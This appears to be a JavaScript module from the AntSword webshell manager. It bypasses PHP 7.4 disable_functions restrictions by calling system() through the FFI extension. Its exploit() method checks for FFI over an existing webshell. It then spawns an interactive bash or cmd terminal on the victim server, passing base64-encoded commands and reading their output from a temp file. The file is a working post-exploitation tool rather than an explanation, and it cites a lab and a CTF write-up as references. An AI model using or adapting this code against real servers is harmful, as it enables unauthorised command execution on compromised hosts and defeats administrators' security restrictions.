'use strict';

const Base = require('../base');
const LANG = require('../../language'); // 插件语言库
const LANG_T = antSword['language']['toastr']; // 通用通知提示
const nodeurl = require('url');
let PHP74_FFI_LANG = LANG['core']['php74_ffi'];

class PHP74_FFI extends Base {
  /**
   * 
   * @param {dhtmlxObject} cell 组件
   * @param {Object} top 上层对象
   */
  constructor(cell, top) {
    super(cell, top);
    if (this.precheck() == false) {
      return;
    }
    this.infodata = {
      ver: this.top.infodata.ver,
      ffi: false,
      ffi_enable: "",
    };
    this.cell = cell;
    this.form = this.createForm(this.cell);
  }

  // 提前检测
  precheck() {
    let self = this;
    let infodata = self.top.infodata;
    // if (infodata.os.toLowerCase() !== "linux") {
    //   toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
    //   return false;
    // }
    if (!self.CompVersion("7.4", infodata.ver)) {
      toastr.error(PHP74_FFI_LANG['err']['phpvererr'], LANG_T['error']);
      return false;
    }
    // 检查 ffi 扩展

    return true;
  }

  createForm(cell) {
    let self = this;
    let form = cell.attachForm([{
        type: 'settings',
        position: 'label-left',
        labelWidth: 100,
        inputWidth: 300,
      }, {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'label',
          labelWidth: 300,
          label: PHP74_FFI_LANG['title']
        }, {
          type: 'block',
          inputWidth: 'auto',
          list: [{
              type: 'settings'
            },
            {
              type: "label",
              label: `<span>${PHP74_FFI_LANG['status_cell']['ver']}</span>`,
            },
            {
              type: "label",
              label: `<span>${PHP74_FFI_LANG['status_cell']['ffi']}</span>`,
            },
            {
              type: "label",
              label: `<span>${PHP74_FFI_LANG['status_cell']['ffi_enable']}</span>`,
            },
            {
              type: "newcolumn"
            },
            {
              type: "label",
              label: `<span style='color: ${self.CompVersion(self.top.infodata['ver'], "7.4")?"green":"red"};'>${antSword.noxss(self.infodata['ver'])}</span>`,
            },
            {
              type: "label",
              label: `<span style='color: ${self.infodata['ffi']?"green":"red"};'>${antSword.noxss(self.infodata['ffi'] === true ?'YES':'NO')}</span>`,
            },
            {
              type: "label",
              label: `<span style='color: ${self.infodata['ffi_enable'] == "1" ?"green":"red"};'>${antSword.noxss(self.infodata['ffi_enable'] === '1' ?'YES': (self.infodata['ffi_enable'] === '' ? 'No': self.infodata['ffi_enable']))}</span>`,
            }
          ],
        }]
      },
      {
        type: 'block',
        labelWidth: 100,
        inputWidth: 'auto',
        className: "display: flex;flex-direction: row;align-items: center;",
        list: [{
          type: 'label',
          label: '',
          name: 'status_label'
        }, {
          type: 'newcolumn',
          offset: 20
        }, {
          type: 'label',
          label: '',
          name: 'status_msg'
        }, ]
      },
      {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'template',
          label: "Reference",
          style: "width:100%;",
          format: references
        }, ]
      }
    ], true);
    return form;
  }

  // 执行EXP, 必须有这个函数
  exploit() {
    let self = this;
    self.core = self.top.core;
    let _precode = {
      _: `$rt = array("ffi" => extension_loaded("ffi"),
      "ffi_enable" => ini_get("ffi.enable"),
      );
      echo json_encode($rt);`
    };
    new Promise((res, rej) => {
      self.core
        .request(_precode)
        .then((_ret) => {
          let _res = antSword.unxss(_ret['text']);
          self.infodata = Object.assign(self.infodata, JSON.parse(_res));
          self.createForm(self.cell);
          res(self.infodata);
        }).catch((err) => {
          rej(err);
        })
    }).then(info => {
      if (!info.ffi) {
        throw new Error(PHP74_FFI_LANG['err']['ffi_not_loaded']);
      }
      if (info.ffi_enable != "1") {
        throw new Error(PHP74_FFI_LANG['err']['ffi_not_enable']);
      }
    })
    .then(() => {
      if (self.top.infodata.os.toLowerCase().indexOf("windows") > -1) {
        new antSword.module.terminal(self.top.opt, {
          exec: (arg = {
            bin: 'cmd',
            cmd: ''
          }) => {
            return {
              _: `$tmp = tempnam(sys_get_temp_dir(), 'as');
$cmd = "${arg['bin']} /c \\\"".@base64_decode("${Buffer.from(arg['cmd']).toString('base64')}")."\\\" > ".$tmp;
$ffi = FFI::cdef("int system(const char *command);", "msvcrt");
$ffi->system($cmd);
echo @file_get_contents($tmp);
unlink($tmp);`
            }
          }
        });
      } else {
        new antSword.module.terminal(self.top.opt, {
          exec: (arg = {
            bin: '/bin/bash',
            cmd: ''
          }) => {
            return {
              _: `$tmp = tempnam(sys_get_temp_dir(), 'as');
$cmd = "${arg['bin']} -c \\\"".@base64_decode("${Buffer.from(arg['cmd']).toString('base64')}")."\\\""." > ".$tmp." 2>&1";
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system($cmd);
echo @file_get_contents($tmp);
unlink($tmp);`
            }
          }
        });
      }
    })
    .catch(err => {
      toastr.error(`${LANG['error']}: ${err}`, LANG_T['error']);
    });
    
  }
}

function references(name, value) {
  let refs = {
    "AntSword-Labs/bypass_disable_functions/8": "https://github.com/AntSwordProject/AntSword-Labs/blob/master/bypass_disable_functions/8",
    "PHP FFI - 一种全新的PHP扩展方式": "https://www.laruence.com/2020/03/11/5475.html",
    "RCTF2019Web题解之nextphp": "https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp",
  };
  let ret = "";
  Object.keys(refs).map((k) => {
    ret += `<li style="padding-bottom: 10px;"><a href='${refs[k]}' target='blank'>${k}</a></li>`;
  })
  return `<div class='simple_link'><ul>${ret}</ul></div>`;
}

module.exports = PHP74_FFI;